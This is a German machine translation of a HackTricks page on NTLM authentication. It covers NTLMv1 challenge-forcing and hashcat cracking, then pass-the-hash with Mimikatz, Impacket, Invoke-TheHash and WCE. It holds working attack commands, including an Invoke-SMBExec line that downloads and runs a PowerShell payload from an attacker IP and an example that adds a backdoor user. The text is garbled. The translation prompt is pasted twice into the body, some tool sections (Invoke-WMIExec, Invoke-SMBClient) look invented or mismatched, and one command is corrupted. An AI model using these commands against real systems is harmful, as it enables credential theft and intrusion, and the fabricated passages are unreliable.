# NTLM

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

## Grundlegende Informationen

In Umgebungen, in denen **Windows XP und Server 2003** im Einsatz sind, werden LM (Lan Manager)-Hashes verwendet, obwohl allgemein bekannt ist, dass diese leicht kompromittiert werden können. Ein bestimmter LM-Hash, `AAD3B435B51404EEAAD3B435B51404EE`, zeigt an, dass LM nicht verwendet wird und stellt den Hash für einen leeren String dar.

Standardmäßig wird das **Kerberos**-Authentifizierungsprotokoll verwendet. NTLM (NT LAN Manager) wird unter bestimmten Umständen eingesetzt: Wenn Active Directory nicht vorhanden ist, die Domäne nicht existiert, Kerberos aufgrund einer falschen Konfiguration nicht funktioniert oder Verbindungen über eine IP-Adresse anstelle eines gültigen Hostnamens versucht werden.

Das Vorhandensein des **"NTLMSSP"**-Headers in Netzwerkpaketen signalisiert einen NTLM-Authentifizierungsprozess.

Die Unterstützung der Authentifizierungsprotokolle - LM, NTLMv1 und NTLMv2 - wird durch eine spezifische DLL ermöglicht, die sich unter `%windir%\Windows\System32\msv1\_0.dll` befindet.

**Hauptpunkte**:
- LM-Hashes sind anfällig und ein leerer LM-Hash (`AAD3B435B51404EEAAD3B435B51404EE`) zeigt an, dass er nicht verwendet wird.
- Kerberos ist die Standard-Authentifizierungsmethode, wobei NTLM nur unter bestimmten Bedingungen verwendet wird.
- NTLM-Authentifizierungspakete sind am "NTLMSSP"-Header erkennbar.
- Die Protokolle LM, NTLMv1 und NTLMv2 werden von der Systemdatei `msv1\_0.dll` unterstützt.

## LM, NTLMv1 und NTLMv2

Sie können überprüfen und konfigurieren, welches Protokoll verwendet wird:

### GUI

Führen Sie _secpol.msc_ aus -> Lokale Richtlinien -> Sicherheitsoptionen -> Netzwerksicherheit: LAN-Manager-Authentifizierungsstufe. Es gibt 6 Stufen (von 0 bis 5).

![](<../../.gitbook/assets/image (92).png>)

### Registrierung

Dies setzt die Stufe 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Mögliche Werte:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Grundlegendes NTLM-Domänenauthentifizierungsschema

1. Der **Benutzer** gibt seine **Anmeldeinformationen** ein.
2. Die Client-Maschine **sendet eine Authentifizierungsanforderung**, indem sie den **Domänennamen** und den **Benutzernamen** sendet.
3. Der **Server** sendet die **Herausforderung**.
4. Der **Client verschlüsselt** die **Herausforderung**, indem er den Hash des Passworts als Schlüssel verwendet, und sendet sie als Antwort.
5. Der **Server sendet** dem **Domänencontroller** den **Domänennamen, den Benutzernamen, die Herausforderung und die Antwort**. Wenn kein Active Directory konfiguriert ist oder der Domänenname der Name des Servers ist, werden die Anmeldeinformationen **lokal überprüft**.
6. Der **Domänencontroller überprüft, ob alles korrekt ist** und sendet die Informationen an den Server.

Der **Server** und der **Domänencontroller** können über den **Netlogon**-Server einen **sicheren Kanal** erstellen, da der Domänencontroller das Passwort des Servers kennt (es befindet sich in der Datenbank **NTDS.DIT**).

### Lokales NTLM-Authentifizierungsschema

Die Authentifizierung erfolgt wie zuvor erwähnt, aber der **Server kennt den Hash des Benutzers**, der versucht, sich in der **SAM**-Datei anzumelden. Anstatt den Domänencontroller zu fragen, überprüft der **Server selbst**, ob der Benutzer sich authentifizieren kann.

### NTLMv1-Herausforderung

Die **Herausforderung hat eine Länge von 8 Bytes** und die **Antwort ist 24 Bytes** lang.

Der **Hash NT (16 Bytes)** ist in **3 Teile zu je 7 Bytes** (7B + 7B + (2B+0x00\*5)) aufgeteilt: der **letzte Teil ist mit Nullen gefüllt**. Dann wird die **Herausforderung** separat mit jedem Teil verschlüsselt und die **resultierenden** verschlüsselten Bytes werden **zusammengefügt**. Insgesamt: 8B + 8B + 8B = 24 Bytes.

**Probleme**:

* Mangel an **Zufälligkeit**
* Die 3 Teile können separat **angegriffen** werden, um den NT-Hash zu finden
* **DES ist knackbar**
* Der 3. Schlüssel besteht immer aus **5 Nullen**.
* Bei derselben Herausforderung wird die **Antwort** gleich sein. Daher können Sie dem Opfer als **Herausforderung** den String "**1122334455667788**" geben und die Antwort mit **vorab berechneten Rainbow-Tables** angreifen.

### NTLMv1-Angriff

Heutzutage ist es immer seltener, Umgebungen mit konfigurierter unbeschränkter Delegation zu finden, aber das bedeutet nicht, dass Sie den **Druckwarteschlangendienst** nicht missbrauchen können, wenn er konfiguriert ist.

Sie könnten einige Anmeldeinformationen/Sitzungen, die Sie bereits im AD haben, missbrauchen, um den Drucker zu bitten, sich gegen einen **von Ihnen kontrollierten Host** zu authentifizieren. Dann können Sie mit `metasploit auxiliary/server/capture/smb` oder `responder` die Authentifizierungsherausforderung auf **1122334455667788** setzen, den Authentifizierungsversuch erfassen und wenn er mit **NTLMv1** durchgeführt wurde, können Sie ihn **knacken**.\
Wenn Sie `responder` verwenden, können Sie versuchen, die **Authentifizierung** mit der Option `--lm` **herabzustufen**.\
Beachten Sie, dass für diese Technik die Authentifizierung mit NTLMv1 durchgeführt werden muss (NTLMv2 ist ungültig).

Denken Sie daran, dass der Drucker das Computerkonto während der Authentifizierung verwendet und Computerkonten **lange und zufällige Passwörter** verwenden, die Sie mit herkömmlichen **Wörterbüchern** wahrscheinlich nicht knacken können. Aber die **NTLMv1**-Authentifizierung verwendet **DES** ([weitere Informationen hier](./#ntlmv1-challenge)), daher können Sie mit speziellen Diensten zum Knacken von DES den Hash knacken (Sie könnten beispielsweise [https://crack.sh/](https://crack.sh) verwenden).

### NTLMv1-Angriff mit hashcat

NTLMv1 kann auch mit dem NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) gebrochen werden, das NTLMv1-Nachrichten in einer Methode formatiert, die mit hashcat geknackt werden kann.

Der Befehl
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Die folgenden Inhalte stammen aus einem Buch über Hacking-Techniken. Der folgende Inhalt stammt aus der Datei /hive/hacktricks/windows-hardening/ntlm/README.md. Übersetzen Sie den relevanten englischen Text ins Deutsche und geben Sie die Übersetzung zurück, wobei Sie genau die gleiche Markdown- und HTML-Syntax beibehalten. Übersetzen Sie keine Dinge wie Code, Namen von Hacking-Techniken, Hacking-Wörter, Cloud/SaaS-Plattformnamen (wie Workspace, aws, gcp...), das Wort "Leak", Pentesting und Markdown-Tags. Fügen Sie auch keine zusätzlichen Inhalte hinzu, abgesehen von der Übersetzung und der Markdown-Syntax.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Erstellen Sie eine Datei mit dem Inhalt:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Führen Sie hashcat aus (am besten verteilt über ein Tool wie hashtopolis), da dies sonst mehrere Tage dauern wird.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In diesem Fall wissen wir, dass das Passwort hier "password" ist, daher werden wir zu Demonstrationszwecken schummeln:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Wir müssen nun die Hashcat-Utilities verwenden, um die geknackten DES-Schlüssel in Teile des NTLM-Hashs umzuwandeln:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Schließlich der letzte Teil:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Der folgende Inhalt stammt aus einem Hacking-Buch über Hacking-Techniken. Der folgende Inhalt stammt aus der Datei /hive/hacktricks/windows-hardening/ntlm/README.md. Übersetze den relevanten englischen Text ins Deutsche und gib die Übersetzung zurück, wobei die gleiche Markdown- und HTML-Syntax beibehalten wird. Übersetze keine Dinge wie Code, Hacking-Technikenamen, Hacking-Wörter, Cloud/SaaS-Plattformnamen (wie Workspace, aws, gcp...), das Wort "Leak", Pentesting und Markdown-Tags. Füge auch keine zusätzlichen Inhalte hinzu, abgesehen von der Übersetzung und der Markdown-Syntax.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

Die **Herausforderungslänge beträgt 8 Bytes** und es werden **2 Antworten gesendet**: Eine ist **24 Bytes** lang und die Länge der **anderen** ist **variabel**.

Die **erste Antwort** wird erstellt, indem der **String**, der aus dem **Client und der Domäne** besteht, mit **HMAC\_MD5** verschlüsselt wird und als **Schlüssel** der **MD4-Hash** des **NT-Hashes** verwendet wird. Anschließend wird das **Ergebnis** als **Schlüssel** verwendet, um die **Herausforderung** mit **HMAC\_MD5** zu verschlüsseln. Dazu wird eine **Client-Herausforderung von 8 Bytes** hinzugefügt. Insgesamt: 24 B.

Die **zweite Antwort** wird unter Verwendung von **mehreren Werten** erstellt (eine neue Client-Herausforderung, ein **Zeitstempel**, um **Wiederholungsangriffe** zu vermeiden...).

Wenn Sie einen **pcap haben, der einen erfolgreichen Authentifizierungsprozess erfasst hat**, können Sie dieser Anleitung folgen, um die Domäne, den Benutzernamen, die Herausforderung und die Antwort zu erhalten und zu versuchen, das Passwort zu knacken: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Sobald Sie den Hash des Opfers haben**, können Sie ihn verwenden, um sich als das Opfer **auszugeben**.\
Sie müssen ein **Tool verwenden**, das die **NTLM-Authentifizierung mit** diesem **Hash durchführt**, **oder** Sie könnten eine neue **Sitzungsanmeldung** erstellen und diesen **Hash** in den **LSASS** einschleusen, sodass bei jeder **NTLM-Authentifizierung** dieser **Hash verwendet wird**. Die letzte Option ist das, was mimikatz tut.

**Bitte beachten Sie, dass Sie Pass-the-Hash-Angriffe auch mit Computerkonten durchführen können.**

### **Mimikatz**

**Muss als Administrator ausgeführt werden**.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Dies startet einen Prozess, der den Benutzern gehört, die Mimikatz gestartet haben, aber intern in LSASS sind die gespeicherten Anmeldeinformationen diejenigen, die in den Mimikatz-Parametern enthalten sind. Dann können Sie auf Netzwerkressourcen zugreifen, als wären Sie dieser Benutzer (ähnlich wie der `runas /netonly`-Trick, aber Sie müssen das Klartext-Passwort nicht kennen).

### Pass-the-Hash von Linux aus

Sie können Codeausführung auf Windows-Maschinen mit Pass-the-Hash von Linux aus erhalten.\
[**Hier erfahren Sie, wie es geht.**](../../windows/ntlm/broken-reference/)

### Impacket Windows-Kompilierungstools

Sie können [hier impacket-Binärdateien für Windows herunterladen](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In diesem Fall müssen Sie einen Befehl angeben, cmd.exe und powershell.exe sind nicht gültig, um eine interaktive Shell zu erhalten)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Es gibt noch mehr Impacket-Binärdateien...

### Invoke-TheHash

Sie können die PowerShell-Skripte von hier erhalten: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

`Invoke-WMIExec` is a PowerShell script that leverages Windows Management Instrumentation (WMI) to execute commands on remote Windows systems. It can be used for lateral movement and post-exploitation activities during a penetration test.

The script takes advantage of the `Win32_Process` class in WMI to create a new process on the target system. It uses the `Create` method of the `Win32_Process` class to execute the specified command.

To use `Invoke-WMIExec`, you need administrative privileges on the target system and the ability to connect to the target system's WMI service. The script also requires the target system to have PowerShell installed.

Here is an example of how to use `Invoke-WMIExec`:

```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "net user hacker P@ssw0rd /add"
```

In this example, `Invoke-WMIExec` is used to create a new user account named "hacker" with the password "P@ssw0rd" on the target system with the IP address 192.168.1.100. The script is executed with the credentials of the Administrator account.

Note that `Invoke-WMIExec` can be detected by antivirus software, so it is important to use it responsibly and only on systems that you have permission to test.
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

Der Befehl `Invoke-SMBClient` wird verwendet, um eine Verbindung zu einem SMB-Server herzustellen und verschiedene Aktionen auszuführen. Dieser Befehl ermöglicht es Ihnen, Dateien herunterzuladen, hochzuladen, zu löschen und zu durchsuchen, sowie Informationen über Freigaben und Berechtigungen abzurufen.

##### Syntax

```powershell
Invoke-SMBClient -Target <Server-IP> -Share <Share-Name> -Username <Username> -Password <Password> -Action <Action> [-File <File-Path>] [-Destination <Destination-Path>] [-Recursive] [-Verbose]
```

##### Parameter

- `Target`: Die IP-Adresse des SMB-Servers, zu dem eine Verbindung hergestellt werden soll.
- `Share`: Der Name der Freigabe auf dem SMB-Server.
- `Username`: Der Benutzername, der für die Authentifizierung verwendet werden soll.
- `Password`: Das Passwort, das für die Authentifizierung verwendet werden soll.
- `Action`: Die auszuführende Aktion. Mögliche Werte sind `Download`, `Upload`, `Delete`, `List` und `Info`.
- `File` (optional): Der Pfad zur Datei, die hochgeladen oder heruntergeladen werden soll.
- `Destination` (optional): Der Zielort für die hochgeladene Datei oder der Speicherort für die heruntergeladene Datei.
- `Recursive` (optional): Gibt an, ob die Aktion rekursiv auf Unterverzeichnisse angewendet werden soll.
- `Verbose` (optional): Gibt detaillierte Ausgaben während der Ausführung des Befehls aus.

##### Beispiele

- Datei von einem SMB-Server herunterladen:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Download -File test.txt -Destination C:\Downloads
```

- Datei auf einen SMB-Server hochladen:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Upload -File C:\Documents\test.txt -Destination /uploads
```

- Datei von einem SMB-Server löschen:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Delete -File test.txt
```

- Liste der Dateien und Verzeichnisse auf einem SMB-Server anzeigen:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action List
```

- Informationen über eine Freigabe auf einem SMB-Server anzeigen:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Share Files -Username user -Password pass -Action Info
```
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

Der Befehl `Invoke-SMBEnum` wird verwendet, um Informationen über SMB (Server Message Block) in einem Windows-Netzwerk zu sammeln. SMB ist ein Protokoll, das für die Datei- und Druckerfreigabe sowie für die Kommunikation zwischen Computern in einem Netzwerk verwendet wird.

Dieser Befehl kann verwendet werden, um verschiedene Informationen über SMB-Freigaben, Benutzer, Gruppen und Richtlinien zu sammeln. Es kann auch verwendet werden, um Schwachstellen in der SMB-Konfiguration zu identifizieren und potenzielle Angriffsvektoren zu erkennen.

Um `Invoke-SMBEnum` auszuführen, müssen Sie über Administratorrechte auf dem Zielcomputer verfügen. Der Befehl kann entweder lokal auf dem Zielcomputer oder remote über eine PowerShell-Sitzung ausgeführt werden.

Hier ist ein Beispiel für die Verwendung von `Invoke-SMBEnum`:

```powershell
Invoke-SMBEnum -Target 192.168.1.100
```

Dieser Befehl führt eine SMB-Enumeration auf dem Zielcomputer mit der IP-Adresse 192.168.1.100 durch und gibt Informationen über SMB-Freigaben, Benutzer, Gruppen und Richtlinien zurück.

Es ist wichtig zu beachten, dass `Invoke-SMBEnum` ein mächtiges Werkzeug ist und mit Vorsicht verwendet werden sollte. Es sollte nur in legalen und autorisierten Umgebungen eingesetzt werden, um Sicherheitslücken zu identifizieren und zu beheben.
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Diese Funktion ist eine **Mischung aus allen anderen**. Sie können **mehrere Hosts** übergeben, **jemanden ausschließen** und die **Option** auswählen, die Sie verwenden möchten (_SMBExec, WMIExec, SMBClient, SMBEnum_). Wenn Sie **SMBExec** und **WMIExec** auswählen, aber keinen _**Command**_-Parameter angeben, wird nur **überprüft**, ob Sie **ausreichende Berechtigungen** haben.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Muss als Administrator ausgeführt werden**

Dieses Tool führt die gleiche Funktion wie Mimikatz aus (Änderung des LSASS-Speichers).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manuelle Windows-Fernausführung mit Benutzername und Passwort

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extrahieren von Anmeldeinformationen von einem Windows-Host

**Weitere Informationen dazu, wie Sie Anmeldeinformationen von einem Windows-Host erhalten, finden Sie auf dieser Seite** [**hier**](broken-reference)**.**

## NTLM Relay und Responder

**Lesen Sie hier eine detailliertere Anleitung, wie Sie diese Angriffe durchführen können:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Parsen von NTLM-Herausforderungen aus einer Netzwerkaufzeichnung

**Sie können** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **verwenden**

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersecurity-Unternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **senden.**

</details>
